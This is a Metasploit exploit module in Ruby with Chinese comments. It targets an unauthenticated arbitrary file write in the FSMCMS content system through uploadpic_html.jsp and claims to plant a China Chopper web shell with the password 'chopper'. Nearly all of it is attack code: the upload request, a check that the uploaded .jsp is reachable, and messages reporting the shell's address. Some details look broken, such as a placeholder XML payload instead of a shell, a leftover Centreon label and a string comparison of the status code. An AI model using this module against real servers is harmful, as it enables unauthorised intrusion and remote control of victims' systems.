require 'msf/core'
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name' => '	FSMCMS系统任意文件写入',
                      'Description' => %q{
                            无需登录等认证即可上传文件,默认上传菜刀马，密码chopper
      },
                      'Author' =>
                          [
                              '路人甲',
                              '扶摇直上打飞机'
                          ],
                      'License' => MSF_LICENSE,
                      'References' =>
                          [
                              ['url', 'http://www.wooyun.org/bugs/wooyun-2015-0144274']
                          ],
                      'Privileged' => true,
                      'Platform' => ['linux'],
                      'Targets' => [['all of them', {}],],
                      'Arch' => ARCH_JAVA,
                      'DefaultTarget' => 0,
          ))
    register_options(
        [
            Opt::RHOST(),
            Opt::RPORT(80),
            OptString.new('TARGETURI', [true, 'The URI of the Centreon Application', '/']),
        ], self.class)
  end

  def rand_file_info
    file_path = rand_text_alphanumeric(6)
    file_name = rand_text_alphanumeric(6)
    return file_path, file_name
  end

  def payload_data
    return '<?xml version="1.0" encoding="UTF-8"?><root></root>'
  end

  def post_data
    file_path, file_name = rand_file_info
    print_status("start to exploit ....")

    res = send_request_cgi(
        {
            'method' => 'POST',
            'uri' => "#{targeturi}/cms/client/uploadpic_html.jsp?toname=#{file_name}.jsp&diskno=#{file_path}",
            'data' => payload_data,
            'headers' =>
                {
                    "User-Agent" => "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0",
                    "Content-Type" => "multipart/form-data;"
                }
        }, timeout = 4)
    check_post = send_request_raw({'uri' => "#{targeturi}/cms-data/temp_dir/#{file_path}/temp.files/#{file_name}.jsp"},timeout = 4)
    if check_post.code != '404'
      file_url = "#{rhost}#{targeturi}/cms-data/temp_dir/#{file_path}/temp.files/#{file_name}.jsp"
      return file_url
    else
      return Exploit::CheckCode::Safe
    end

  end

  def exploit
    post_res = post_data
    if post_res == Exploit::CheckCode::Safe
      fail_with(Failure::Unknown,"cannot exploit target ~_~")
    else
      print_good("finshed exploit ^_^")
      print_good(post_res)
      print_good("菜刀链接密码为chopper")
    end
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  def targeturi
    datastore['TARGETURI']
  end

end